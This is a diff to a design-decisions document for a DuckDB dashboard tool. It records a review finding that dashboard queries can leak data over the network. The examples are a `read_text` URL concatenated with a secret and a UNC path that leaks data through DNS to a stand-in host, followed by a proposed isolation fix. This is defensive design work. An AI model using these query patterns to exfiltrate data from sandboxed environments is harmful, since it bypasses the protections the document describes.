@@ -102,8 +102,16 @@ any write that gets past it. Neither one alone is enough.
 
 **Limits:** a SELECT can still call `read_csv('C:/anything')`, so a dashboard
 can read files outside its manifest. DuckDB's `enable_external_access` would
-stop that, but it applies to the whole profile database. Blocking the network
-(decision 11) means such data can be shown but not sent anywhere.
+stop that, but it applies to the whole profile database. Decision 11 blocks
+the page's own network, but **not DuckDB's**: the review before release
+found that `read_text('http://…' || secret)` makes DuckDB install httpfs and
+send the request, a UNC path such as `\\<data>.example.com\x` sends the data
+out in a DNS lookup, and a loaded Postgres or MySQL extension can connect to
+any host. So a dashboard can send out what it reads, and is trusted like a
+script; the help says so. Every DuckDB setting that would stop this
+(`enable_external_access`, `allowed_paths`, `disabled_filesystems`) applies to
+the whole database, so the fix is dashboard queries in a DuckDB of their own
+(see the end of this file).
 
 **Your notes:**
 
@@ -175,9 +183,10 @@ Every other request gets a 403, the page has a content security policy with
 don't open.
 
 **Why:** Claude's dashboards often use a chart library from a CDN, and
-blocking those would make many of them fail. Blocking everything else means
-a page can show data but can't send it anywhere, which is what makes
-decision 6's limits acceptable. A library saved next to the dashboard
+blocking those would make many of them fail. Blocking everything else keeps
+the page's own scripts from sending data anywhere. It was meant to make
+decision 6's limits acceptable, but DuckDB can still reach the network for a
+query (decision 6). A library saved next to the dashboard
 (`lib/echarts.min.js`) works offline.
 
 **Turned down:** no network at all (breaks most generated dashboards); letting
@@ -523,6 +532,11 @@ with only the exe to go on.
 - **Sending command-line work to a running DataDiver** (decision 21).
 - **Drill-through** from a chart to the grid, and opening a query in the SQL
   editor (the query log copies it today).
+- **Dashboard queries that can't reach the network** (decision 6): a DuckDB
+  of their own with `enable_external_access` off and `allowed_paths` set to
+  the manifest's files, so DuckDB itself refuses URLs, UNC hosts and other
+  files. The profile's watched files would become views there; databases
+  the startup script attaches are the open question.
 - **A trust prompt for dashboards downloaded from the internet** (the
   `Zone.Identifier` mark).
 - **Arrow transport** for large results (decision 13).
